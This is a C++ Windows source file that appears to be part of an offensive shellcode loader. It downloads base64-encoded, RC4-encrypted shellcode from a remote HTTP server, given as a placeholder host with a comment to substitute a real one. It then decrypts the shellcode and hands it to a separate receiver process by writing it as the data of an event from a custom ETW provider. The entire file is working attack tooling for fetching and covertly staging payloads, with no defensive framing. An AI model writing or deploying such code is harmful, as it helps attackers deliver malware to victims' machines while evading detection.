#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <evntprov.h>    // ETW Providers
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")

using namespace std;

const string RC4Key = "key"; // RC4 key

// Unique GUID for our custom ETW Provider (must match receiver)
static const GUID ProviderGuid = { 0xdeadc0de, 0x1337, 0x6969, { 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89 } };

REGHANDLE hProvider = 0;

string FetchBase64Shellcode(const wchar_t* server, const wchar_t* resource) {
    string response;
    HINTERNET hSessionHTTP = WinHttpOpen(L"ETWShellcodeLoaderHTTP/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSessionHTTP) {
        cerr << "[!] WinHttpOpen failed. Error: " << GetLastError() << endl;
        return "";
    }
    HINTERNET hConnect = WinHttpConnect(hSessionHTTP, server, 80, 0);
    if (!hConnect) {
        cerr << "[!] WinHttpConnect failed. Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", resource, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        cerr << "[!] WinHttpOpenRequest failed. Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        cerr << "[!] WinHttpSendRequest failed. Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        cerr << "[!] WinHttpReceiveResponse failed. Error: " << GetLastError() << endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSessionHTTP);
        return "";
    }
    DWORD dwSize = 0;
    do {
        DWORD dwDownloaded = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            cerr << "[!] WinHttpQueryDataAvailable failed. Error: " << GetLastError() << endl;
            break;
        }
        if (dwSize == 0)
            break;
        char* buffer = new char[dwSize + 1];
        ZeroMemory(buffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
            cerr << "[!] WinHttpReadData failed. Error: " << GetLastError() << endl;
            delete[] buffer;
            break;
        }
        response.append(buffer, dwDownloaded);
        delete[] buffer;
    } while (dwSize > 0);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSessionHTTP);
    return response;
}

vector<unsigned char> DecodeBase64(const string& base64Data) {
    vector<unsigned char> decoded;
    DWORD cbBinary = 0;
    if (!CryptStringToBinaryA(base64Data.c_str(), 0, CRYPT_STRING_BASE64, NULL, &cbBinary, NULL, NULL)) {
        cerr << "[!] CryptStringToBinaryA (size query) failed. Error: " << GetLastError() << endl;
        return decoded;
    }
    decoded.resize(cbBinary);
    if (!CryptStringToBinaryA(base64Data.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &cbBinary, NULL, NULL)) {
        cerr << "[!] CryptStringToBinaryA (decode) failed. Error: " << GetLastError() << endl;
        decoded.clear();
    }
    return decoded;
}

void RC4DecryptInPlace(vector<unsigned char>& data, const string& key) {
    vector<unsigned char> S(256), K(256);
    for (int i = 0; i < 256; i++) {
        S[i] = (unsigned char)i;
        K[i] = (unsigned char)key[i % key.length()];
    }
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        swap(S[i], S[j]);
    }
    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        swap(S[i], S[j]);
        int t = (S[i] + S[j]) % 256;
        unsigned char k = S[t];
        data[n] ^= k;
    }
}

void RegisterETWProvider() {
    ULONG status = EventRegister(&ProviderGuid, NULL, NULL, &hProvider);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] Failed to register ETW provider. Error: " << status << endl;
        exit(1);
    }
    cout << "[+] ETW provider registered." << endl;
}

void UnregisterETWProvider() {
    EventUnregister(hProvider);
    cout << "[*] ETW provider unregistered." << endl;
}

void SendShellcodeEvent(const unsigned char* shellcodeData, DWORD shellcodeSize) {
    if (!shellcodeData || shellcodeSize == 0) {
        cerr << "[!] No shellcode available to send." << endl;
        return;
    }
    EVENT_DESCRIPTOR EventDesc = { 0 };
    EVENT_DATA_DESCRIPTOR dataDesc;
    EventDataDescCreate(&dataDesc, shellcodeData, shellcodeSize);
    cout << "[*] Sending shellcode via ETW event..." << endl;
    ULONG status = EventWrite(hProvider, &EventDesc, 1, &dataDesc);
    if (status != ERROR_SUCCESS) {
        cerr << "[!] EventWrite failed. Error: " << status << endl;
    }
}

int main() {
    // Fetch the base64-encoded, RC4-encrypted shellcode from an HTTP server.
    wcout << L"[*] Fetching base64 shellcode from HTTP server..." << endl;
    // Replace with your actual server and resource.
    string base64Shellcode = FetchBase64Shellcode(L"shellcode-hosting.com", L"/shellcode.txt");
    if (base64Shellcode.empty()) {
        cerr << "[!] Failed to fetch base64 shellcode." << endl;
        return 1;
    }
    cout << "[+] Base64 shellcode fetched (" << base64Shellcode.size() << " bytes)." << endl;

    // Decode the base64 shellcode.
    vector<unsigned char> decoded = DecodeBase64(base64Shellcode);
    if (decoded.empty()) {
        cerr << "[!] Failed to decode base64 shellcode." << endl;
        return 1;
    }
    cout << "[+] Shellcode decoded successfully. Size: " << decoded.size() << " bytes." << endl;

    // RC4-decrypt the decoded shellcode in-place.
    RC4DecryptInPlace(decoded, RC4Key);
    cout << "[+] Shellcode decrypted successfully. Final size: " << decoded.size() << " bytes." << endl;
    
    // Register the ETW provider.
    RegisterETWProvider();
    
    // Send the shellcode event via ETW.
    SendShellcodeEvent(decoded.data(), (DWORD)decoded.size());
    
    // Unregister the ETW provider.
    UnregisterETWProvider();
    return 0;
}
